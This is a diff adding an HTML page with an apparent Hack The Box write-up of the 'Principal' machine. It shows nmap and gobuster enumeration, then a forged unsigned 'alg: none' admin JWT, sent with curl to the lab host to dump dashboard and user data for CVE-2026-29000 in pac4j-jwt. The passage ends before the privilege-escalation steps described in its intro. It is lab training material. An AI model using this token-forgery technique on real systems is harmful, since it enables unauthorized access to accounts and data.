@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Principal - Hack The Box Machine</title>
+    <!-- Highlight.js for code blocks -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/tokyo-night-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <!-- Marked.js for markdown parsing -->
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+    <style>
+        :root {
+            --bg-color: #020203; /* Main portfolio BG */
+            --text-color: #e4e2e4;
+            --accent-color: #0071e3;
+            --primary: #abc7ff;
+            --code-bg: #131315; /* darker surface */
+            --glass-bg: linear-gradient(135deg, rgba(255, 255, 255, 0.04), rgba(255, 255, 255, 0.01));
+            --border-color: rgba(255, 255, 255, 0.05);
+            --link-color: #abc7ff;
+            
+            /* Terminal aesthetic vars */
+            --term-border: #4d3a68;
+            --term-bg: rgba(26, 17, 36, 0.85); /* Dark purple tint */
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            padding: 0;
+            margin: 0;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Aurora Blobs */
+        .aurora-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -10;
+            overflow: hidden;
+            background: #020203;
+            pointer-events: none;
+        }
+
+        .aurora-blob {
+            position: absolute;
+            filter: blur(120px);
+            opacity: 0.7;
+            animation: float 20s infinite ease-in-out alternate;
+            border-radius: 50%;
+        }
+
+        .blob-1 { top: -20%; left: -10%; width: 60vw; height: 60vh; background: rgba(150, 10, 103, 0.35); animation-delay: 0s; }
+        .blob-2 { top: 30%; left: 50%; width: 70vw; height: 70vh; background: rgba(139, 92, 246, 0.3); animation-delay: -5s; }
+        .blob-3 { bottom: -20%; left: 10%; width: 50vw; height: 50vh; background: rgba(18, 8, 153, 0.25); animation-delay: -10s; }
+
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1) rotate(0deg); }
+            33% { transform: translate(15vw, -10vh) scale(1.1) rotate(5deg); }
+            66% { transform: translate(-10vw, 10vh) scale(0.9) rotate(-5deg); }
+            100% { transform: translate(0, 0) scale(1) rotate(0deg); }
+        }
+
+        #glass-container {
+            max-width: 900px;
+            margin: 60px auto;
+            padding: 50px 60px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px) saturate(150%);
+            -webkit-backdrop-filter: blur(16px) saturate(150%);
+            border: 1px solid var(--border-color);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            border-left: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.25);
+            font-size: 16px;
+        }
+
+        h1, h2, h3, h4, h5, h6 {
+            color: #ffffff;
+            margin-top: 2em;
+            margin-bottom: 0.5em;
+            font-weight: 700;
+            letter-spacing: -0.025em;
+        }
+
+        h1 { font-size: 2.5em; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; margin-top: 0.5em;}
+        h2 { font-size: 1.8em; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
+        h3 { font-size: 1.4em; }
+
+        a { color: var(--link-color); text-decoration: none; transition: opacity 0.2s; }
+        a:hover { opacity: 0.8; text-decoration: underline; }
+
+        p { margin-bottom: 1.5em; }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 30px auto;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        pre {
+            background-color: #1a1025 !important;
+            padding: 45px 24px 24px 24px; /* Extra top padding for the header */
+            border-radius: 10px;
+            overflow-x: auto;
+            border: 1px solid rgba(255, 255, 255, 0.1); /* Subtle window outline */
+            margin: 2.5em 0;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6); /* Deep drop shadow */
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            position: relative;
+        }
+
+        /* Terminal window header */
+        pre::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 32px;
+            background: #251833; /* Slightly lighter header bar */
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            z-index: 0;
+        }
+
+        /* Window controls (Mac style dots) */
+        pre::after {
+            content: '';
+            position: absolute;
+            top: 11px;
+            left: 16px;
+            width: 11px;
+            height: 11px;
+            border-radius: 50%;
+            background-color: #ff5f56;
+            box-shadow: 19px 0 0 #ffbd2e, 38px 0 0 #27c93f;
+            z-index: 1;
+        }
+
+        code {
+            font-family: 'Fira Code', 'Cascadia Code', 'JetBrains Mono', 'Consolas', monospace;
+            font-size: 0.85em;
+            background-color: rgba(255,255,255,0.05);
+            padding: 4px 8px;
+            border-radius: 6px;
+        }
+        
+        pre code, pre code.hljs {
+            border: none;
+            padding: 0;
+            background-color: transparent !important;
+            white-space: pre;
+            word-wrap: normal;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Powerline/Terminal prompt styles for text elements inside code that might resemble prompts */
+        .hljs-meta { color: #8b5cf6 !important; font-weight: bold; } /* Makes prompts pop */
+        .hljs-string { color: #10b981 !important; }
+        .hljs-keyword { color: #3b82f6 !important; }
+        .hljs-title.function_ { color: #f59e0b !important; }
+
+        blockquote {
+            border-left: 4px solid var(--primary);
+            margin: 2em 0;
+            padding: 15px 24px;
+            color: #c1c6d6;
+            background-color: rgba(171, 199, 255, 0.05);
+            border-radius: 0 12px 12px 0;
+            font-style: italic;
+        }
+
+        ul, ol { padding-left: 2rem; margin-bottom: 1.5em; }
+        li { margin-bottom: 0.5em; }
+        hr { border: 0; height: 1px; background: rgba(255,255,255,0.1); margin: 3em 0; }
+
+        table { border-collapse: collapse; width: 100%; margin-bottom: 2em; border-radius: 8px; overflow: hidden; }
+        table, th, td { border: 1px solid rgba(255,255,255,0.1); }
+        th, td { padding: 12px 16px; text-align: left; }
+        th { background-color: var(--code-bg); font-weight: 600; }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 30px;
+            color: var(--text-color);
+            font-size: 0.9em;
+            opacity: 0.6;
+            transition: all 0.2s;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+
+        .back-button:hover { opacity: 1; text-decoration: none; color: white; transform: translateX(-4px); }
+        
+        /* Mobile fixes */
+        @media (max-width: 768px) {
+            #glass-container { margin: 20px; padding: 30px 20px; }
+            h1 { font-size: 2em; }
+        }
+
+        /* Elegant Scrollbar */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.15); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(171, 199, 255, 0.5); }
+        * { scrollbar-width: thin; scrollbar-color: rgba(255, 255, 255, 0.15) transparent; }
+    </style>
+    <!-- MathJax for rendering equations -->
+    <script>
+        MathJax = {
+          tex: { inlineMath: [['$', '$'], ['\\(', '\\)']], displayMath: [['$$', '$$'], ['\\[', '\\]']] },
+          svg: { fontCache: 'global' }
+        };
+    </script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+<body>
+    <div class="aurora-bg">
+        <div class="aurora-blob blob-1"></div>
+        <div class="aurora-blob blob-2"></div>
+        <div class="aurora-blob blob-3"></div>
+    </div>
+
+    <div id="glass-container">
+        <a href="../../index.html#writeups" class="back-button">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+            BACK TO PORTFOLIO
+        </a>
+        <div id="content"></div>
+    </div>
+
+    <script>
+        // Use marked options for github flavored markdown
+        marked.setOptions({
+            gfm: true,
+            breaks: true,
+        });
+
+        // The markdown file to fetch
+        const markdownFile = 'Principal - HackTheBox.md';
+
+        fetch(markdownFile)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
+            .then(text => {
+                // Pre-process Obsidian image wikilinks ![[image.png]] -> ![image.png](image.png)
+                let processedText = text.replace(/!\[\[(.*?)\]\]/g, (match, p1) => `![${p1}](${encodeURI(p1)})`);
+                
+                // Parse markdown to HTML
+                let htmlContent = marked.parse(processedText);
+                
+                document.getElementById('content').innerHTML = htmlContent;
+                
+                // Apply syntax highlighting
+                document.querySelectorAll('pre code').forEach((block) => {
+                    hljs.highlightElement(block);
+                });
+
+                // Let MathJax process math blocks newly injected
+                if (window.MathJax) {
+                    MathJax.typesetPromise([document.getElementById('content')]).catch(function (err) {
+                        console.error('MathJax error: ', err.message);
+                    });
+                }
+            })
+            .catch(error => {
+                console.error('Fetch failed, falling back to embedded content', error);
+                
+                // If fetch fails (CORS error from file://), fallback to the embedded markdown string.
+                // We fetch the markdown via a hidden textarea created safely in the script.
+                const preloadedRawMarkdown = document.getElementById('embedded-markdown').value;
+                let processedText = preloadedRawMarkdown.replace(/!\[\[(.*?)\]\]/g, (match, p1) => `![${p1}](${encodeURI(p1)})`);
+                let htmlContent = marked.parse(processedText);
+                document.getElementById('content').innerHTML = htmlContent;
+                
+                document.querySelectorAll('pre code').forEach((block) => {
+                    hljs.highlightElement(block);
+                });
+
+                if (window.MathJax) {
+                    MathJax.typesetPromise([document.getElementById('content')]);
+                }
+            });
+    </script>
+    <textarea id="embedded-markdown" style="display:none;">
+Principal is a medium difficulty machine that is themed around misplaced cryptographic trust. The foothold exploits [CVE-2026-29000](https://nvd.nist.gov/vuln/detail/CVE-2026-29000), an authentication bypass in pac4j-jwt&#039;s JwtAuthenticator where a PlainJWT wrapped inside a valid JWE envelope bypasses signature verification entirely. After forging an admin token and extracting SSH credentials from the corporate dashboard, privilege escalation abuses an SSH CA configuration that trusts any certificate signed by the CA without validating the principal (username) claim, allowing us to forge a certificate for root. Both attack stages exploit the same class of flaw: a system that verifies the cryptographic envelope but never validates the identity claim inside it.
+
+Let's start by performing an nmap scan over the target `10.129.40.176`
+```
+❯ nmap -sC -sV -p- -O --min-rate 5000 10.129.40.176
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-19 11:10 CEST
+Nmap scan report for 10.129.40.176
+Host is up (0.042s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
+|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
+8080/tcp open  http-proxy Jetty
+|_http-server-header: Jetty
+| http-title: Principal Internal Platform - Login
+|_Requested resource was /login
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Date: Sun, 19 Apr 2026 09:11:05 GMT
+|     Server: Jetty
+|     X-Powered-By: pac4j-jwt/6.0.3
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: application/json
+|     {"timestamp":"2026-04-19T09:11:05.647+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
+|   GetRequest: 
+|     HTTP/1.1 302 Found
+|     Date: Sun, 19 Apr 2026 09:11:05 GMT
+|     Server: Jetty
+|     X-Powered-By: pac4j-jwt/6.0.3
+|     Content-Language: en
+|     Location: /login
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sun, 19 Apr 2026 09:11:05 GMT
+|     Server: Jetty
+|     X-Powered-By: pac4j-jwt/6.0.3
+|     Allow: GET,HEAD,OPTIONS
+|     Accept-Patch: 
+|     Content-Length: 0
+|   RTSPRequest: 
+|     HTTP/1.1 505 HTTP Version Not Supported
+|     Date: Sun, 19 Apr 2026 09:11:05 GMT
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 349
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+|     <title>Error 505 Unknown Version</title>
+|     </head>
+|     <body>
+|     <h2>HTTP ERROR 505 Unknown Version</h2>
+|     <table>
+|     <tr><th>URI:</th><td>/badMessage</td></tr>
+|     <tr><th>STATUS:</th><td>505</td></tr>
+|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
+|     </table>
+|     </body>
+|     </html>
+|   Socks5: 
+|     HTTP/1.1 400 Bad Request
+|     Date: Sun, 19 Apr 2026 09:11:05 GMT
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 382
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+|     <title>Error 400 Illegal character CNTL=0x5</title>
+|     </head>
+|     <body>
+|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
+|     <table>
+|     <tr><th>URI:</th><td>/badMessage</td></tr>
+|     <tr><th>STATUS:</th><td>400</td></tr>
+|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
+|     </table>
+|     </body>
+|_    </html>
+|_http-open-proxy: Proxy might be redirecting requests
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.95%I=7%D=4/19%Time=69E49C28%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Sun,\x2019\x20Apr\x2
+SF:02026\x2009:11:05\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20pac4j-
+SF:jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\nConten
+SF:t-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK\r\nDa
+SF:te:\x20Sun,\x2019\x20Apr\x202026\x2009:11:05\x20GMT\r\nServer:\x20Jetty
+SF:\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTIONS\r\
+SF:nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,220,
+SF:"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:\x20Su
+SF:n,\x2019\x20Apr\x202026\x2009:11:05\x20GMT\r\nCache-Control:\x20must-re
+SF:validate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-88
+SF:59-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20http-equ
+SF:iv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<tit
+SF:le>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<h2>HTT
+SF:P\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>URI:</th
+SF:><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>\n<tr>
+SF:<th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</body>\
+SF:n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20Found\
+SF:r\nDate:\x20Sun,\x2019\x20Apr\x202026\x2009:11:05\x20GMT\r\nServer:\x20
+SF:Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20must-r
+SF:evalidate,no-cache,no-store\r\nContent-Type:\x20application/json\r\n\r\
+SF:n{\"timestamp\":\"2026-04-19T09:11:05\.647\+00:00\",\"status\":404,\"er
+SF:ror\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak
+SF:\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Sun,
+SF:\x2019\x20Apr\x202026\x2009:11:05\x20GMT\r\nCache-Control:\x20must-reva
+SF:lidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-8859
+SF:-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http-equiv
+SF:=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<title
+SF:>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head>\n<bo
+SF:dy>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5</h2>\
+SF:n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:</
+SF:th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20character\x20
+SF:CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.79 seconds
+```
+
+From this scan we can see two interesting things:
+1. We have 2 TCP ports up, `22 SSH` and a alternative http in `8080`, running Jetty.
+2. The use of `pac4j-jwt` suggests that authentication is token-based.
+
+## Directory brute-forcing
+Now, let's run `gobuster` to perform directory fuzzing and enumerate further.
+
+```
+❯ gobuster dir -u http://10.129.40.176:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150 --exclude-length 381
+```
+As I always mention, DO NOT USE the flag `-t 500` in a professional or real-life scenario. YOU WILL GET IN TROUBLE because that could be flagged as malicious, as it is esentially a DoS, even in CTF competitions is not the most professional way to accelerate results. 
+That said, let's see the results:
+```
+❯ gobuster dir -u http://10.129.40.176:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300 --exclude-length 381
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.40.176:8080/
+[+] Method:                  GET
+[+] Threads:                 300
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          381
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/login                (Status: 200) [Size: 6152]
+/error                (Status: 500) [Size: 73]
+/dashboard            (Status: 200) [Size: 3930]
+/web-inf              (Status: 500) [Size: 73]
+Progress: 220558 / 220558 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+
+We'll head to `http://10.129.40.176:8080/login` to see what the port 8080 has in store for us.
+![[Pasted image 20260419111626.png]]
+
+We can see a login page, but checking the page source we can dig deeper in the WebApp code.
+
+In line `110` we can find this: `<script src="/static/js/app.js"></script>` which means that the javascript of this app is stored at `/static/js/app.js`, so let's check it out.
+
+In the script page we can find this:
+```
+const API_BASE = '';
+const JWKS_ENDPOINT = '/api/auth/jwks';
+const AUTH_ENDPOINT = '/api/auth/login';
+const DASHBOARD_ENDPOINT = '/api/dashboard';
+const USERS_ENDPOINT = '/api/users';
+const SETTINGS_ENDPOINT = '/api/settings';
+```
+
+These are really good endpoints for enumeration.
+
+### /api/auth/login:
+```
+<html><body><h1>Whitelabel Error Page</h1><p>This application has no explicit mapping for /error, so you are seeing this as a fallback.</p><div id='created'>Sun Apr 19 09:24:46 UTC 2026</div><div>There was an unexpected error (type=Method Not Allowed, status=405).</div></body></html>
+```
+
+This error does not mean that the page does not exist, but rather that the HTTP method you used is not the one the server expects for that URL.
+
+That's because accessing through the browser is esentially a `curl GET`, and the resource doesn't expect that `GET` method.
+
+```
+❯ curl -X OPTIONS http://10.129.40.176:8080/api/auth/login -i
+HTTP/1.1 200 OK
+Date: Sun, 19 Apr 2026 09:36:52 GMT
+Server: Jetty
+X-Powered-By: pac4j-jwt/6.0.3
+Allow: POST,OPTIONS
+Accept-Patch: 
+Content-Length: 0
+```
+
+As i imagined, the server expects a `POST` in order to perform a login.
+
+
+
+### /api/auth/jwks
+```
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "e": "AQAB",
+      "kid": "enc-key-1",
+      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
+    }
+  ]
+}
+```
+
+Here we can tell a couple of things:
+- **kid (Key ID):** `enc-key-1`. This is the label that the server will use in the JWE header
+- **n (Modulus):** It is the large number that makes up part of the public key.
+- **kty (Key Type):** This confirms that the server uses asymmetric key cryptography.
+
+## Exploitation
+#### CVE-2026-29000
+**As NIST mentions:** pac4j-jwt versions prior to 4.5.9, 5.7.9, and 6.3.3 contain an authentication bypass vulnerability in JwtAuthenticator when processing encrypted JWTs that allows remote attackers to forge authentication tokens. Attackers who possess the server's RSA public key can create a JWE-wrapped PlainJWT with arbitrary subject and role claims, bypassing signature verification to authenticate as any user including administrators.
+
+So let's start by crafting our JWT, this time we will use `jwt.io`
+
+**Header:**
+```
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+```
+
+**Payload:**
+```
+{
+  "sub": "admin",
+  "role": "ROLE_ADMIN",
+  "iss": "principal-platform",
+  "iat": 1516239022,
+  "exp": 2516239022
+}
+```
+
+Encoded JWT:
+```
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIiwiaXNzIjoicHJpbmNpcGFsLXBsYXRmb3JtIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjI1MTYyMzkwMjJ9.
+```
+
+Now with that token, let's send the request to the server with `curl`.
+```
+❯ curl -i -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIiwiaXNzIjoicHJpbmNpcGFsLXBsYXRmb3JtIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjI1MTYyMzkwMjJ9." http://10.129.40.176:8080/api/dashboard
+HTTP/1.1 200 OK
+Date: Sun, 19 Apr 2026 10:20:59 GMT
+Server: Jetty
+X-Powered-By: pac4j-jwt/6.0.3
+Content-Type: application/json
+Transfer-Encoding: chunked
+
+{"announcements":[{"severity":"info","title":"Maintenance Window","message":"Scheduled maintenance on Jan 15 02:00-04:00 UTC. Deploy pipelines will be paused.","date":"2025-12-30"},{"severity":"warning","title":"New SSH CA Rotation","message":"SSH CA keys have been rotated. All deploy certificates issued before Dec 1 are revoked.","date":"2025-12-15"}],"user":{"username":"admin","role":"ROLE_ADMIN"},"recentActivity":[{"details":"Failed login attempt","username":"test","action":"LOGIN_FAILED","timestamp":"2026-04-19T10:09:57.930043"},{"details":"Failed login attempt","username":"dev","action":"LOGIN_FAILED","timestamp":"2026-04-19T10:09:53.193370"},{"details":"Failed login attempt","username":"user1","action":"LOGIN_FAILED","timestamp":"2026-04-19T09:42:53.644287"},{"details":"Failed login attempt","username":"user","action":"LOGIN_FAILED","timestamp":"2026-04-19T09:42:16.142589"},{"details":"Failed login attempt","username":"admin","action":"LOGIN_FAILED","timestamp":"2026-04-19T09:40:07.361919"},{"details":"Failed login attempt","username":"admin","action":"LOGIN_FAILED","timestamp":"2026-04-19T09:40:07.176360"},{"details":"Failed login attempt","username":"admin","action":"LOGIN_FAILED","timestamp":"2026-04-19T09:40:06.742744"},{"details":"Failed login attempt","username":"admin","action":"LOGIN_FAILED","timestamp":"2026-04-19T09:40:06.085130"},{"details":"Failed login attempt","username":"guest","action":"LOGIN_FAILED","timestamp":"2026-04-19T09:40:00.625704"},{"details":"SSH certificate issued for deploy-1735400000","username":"svc-deploy","action":"CERT_ISSUED","timestamp":"2026-03-05T21:43:40.443553"},{"details":"Successful login","username":"amorales","action":"LOGIN_SUCCESS","timestamp":"2026-03-05T21:28:40.443553"},{"details":"Deployment #848 - staging hotfix","username":"svc-deploy","action":"DEPLOY_TRIGGERED","timestamp":"2026-03-05T21:13:40.443553"},{"details":"Failed login attempt","username":"administrator","action":"LOGIN_FAILED","timestamp":"2026-03-05T20:58:40.443553"},{"details":"Accessed system settings","username":"admin","action":"SETTINGS_VIEWED","timestamp":"2026-03-05T19:58:40.443553"},{"details":"Successful login","username":"jthompson","action":"LOGIN_SUCCESS","timestamp":"2026-03-05T18:58:40.443553"},{"details":"Deployment #847 - production v1.2.0","username":"svc-deploy","action":"DEPLOY_TRIGGERED","timestamp":"2026-03-05T17:58:40.443553"},{"details":"Updated user kkumar: set active=false","username":"admin","action":"USER_UPDATED","timestamp":"2026-03-05T16:58:40.443553"},{"details":"Successful login","username":"admin","action":"LOGIN_SUCCESS","timestamp":"2026-03-05T15:58:40.443553"}],"stats":{"lastDeployment":"2025-12-28T14:32:00Z","uptimePercent":99.7,"activeDeployments":3,"pendingAlerts":2,"totalUsers":8,"systemHealth":"operational"}}%
+```
+
+Basically, what we can see there is that we've successfully performed the bypass and the server has accepted our JWK as valid, granting us access to `/dashboard`, giving us a couple of valid users:
+- admin
+- amorales
+- jthompson
+- kkumar
+- svc-deploy (A service account for deploys)
+
+Now, as we are `ROLE_ADMIN`, we have access to a very sensitive endpoint, `/api/users`, as well as `/api/settings`.
+
+### /api/users
+```
+❯ curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIiwiaXNzIjoicHJpbmNpcGFsLXBsYXRmb3JtIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjI1MTYyMzkwMjJ9." http://10.129.40.176:8080/api/users | jq
+{
+  "total": 8,
+  "users": [
+    {
+      "username": "admin",
+      "email": "s.chen@principal-corp.local",
+      "displayName": "Sarah Chen",
+      "department": "IT Security",
+      "id": 1,
+      "lastLogin": "2025-12-28T09:15:00Z",
+      "active": true,
+      "role": "ROLE_ADMIN",
+      "note": ""
+    },
+    {
+      "username": "svc-deploy",
+      "email": "svc-deploy@principal-corp.local",
+      "displayName": "Deploy Service",
+      "department": "DevOps",
+      "id": 2,
+      "lastLogin": "2025-12-28T14:32:00Z",
+      "active": true,
+      "role": "deployer",
+      "note": "Service account for automated deployments via SSH certificate auth."
+    },
+    {
+      "username": "jthompson",
+      "email": "j.thompson@principal-corp.local",
+      "displayName": "James Thompson",
+      "department": "Engineering",
+      "id": 3,
+      "lastLogin": "2025-12-27T16:45:00Z",
+      "active": true,
+      "role": "ROLE_USER",
+      "note": "Team lead - backend services"
+    },
+    {
+      "username": "amorales",
+      "email": "a.morales@principal-corp.local",
+      "displayName": "Ana Morales",
+      "department": "Engineering",
+      "id": 4,
+      "lastLogin": "2025-12-28T08:20:00Z",
+      "active": true,
+      "role": "ROLE_USER",
+      "note": "Frontend developer"
+    },
+    {
+      "username": "bwright",
+      "email": "b.wright@principal-corp.local",
+      "displayName": "Benjamin Wright",
+      "department": "Operations",
+      "id": 5,
+      "lastLogin": "2025-12-26T11:30:00Z",
+      "active": true,
+      "role": "ROLE_MANAGER",
+      "note": "Operations manager"
+    },
+    {
+      "username": "kkumar",
+      "email": "k.kumar@principal-corp.local",
+      "displayName": "Kavitha Kumar",
+      "department": "IT Security",
+      "id": 6,
+      "lastLogin": "2025-12-20T10:00:00Z",
+      "active": false,
+      "role": "ROLE_ADMIN",
+      "note": "Security analyst - on leave until Jan 6"
+    },
+    {
+      "username": "mwilson",
+      "email": "m.wilson@principal-corp.local",
+      "displayName": "Marcus Wilson",
+      "department": "QA",
+      "id": 7,
+      "lastLogin": "2025-12-28T13:10:00Z",
+      "active": true,
+      "role": "ROLE_USER",
+      "note": "QA engineer"
+    },
+    {
+      "username": "lzhang",
+      "email": "l.zhang@principal-corp.local",
+      "displayName": "Lisa Zhang",
+      "department": "Engineering",
+      "id": 8,
+      "lastLogin": "2025-12-28T07:55:00Z",
+      "active": true,
+      "role": "ROLE_MANAGER",
+      "note": "Engineering director"
+    }
+  ]
+}
+```
+
+### /api/settings
+```
